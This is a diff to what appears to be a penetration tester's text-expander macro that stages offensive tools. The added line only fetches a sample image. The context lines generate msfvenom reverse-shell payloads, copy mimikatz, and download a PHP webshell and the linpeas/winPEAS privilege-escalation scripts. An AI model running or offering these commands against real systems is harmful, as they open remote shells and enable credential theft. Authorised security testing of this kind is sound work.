@@ -39,6 +39,7 @@ matches:
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe >/dev/null &
       msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh -o rev.ps1 >/dev/null &
       cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
+      wget -q https://raw.githubusercontent.com/IQAndreas/sample-images/refs/heads/gh-pages/100-100-color/01.jpg &
       wget -q https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh &
       wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/winPEASany.exe -O winpeas.exe &
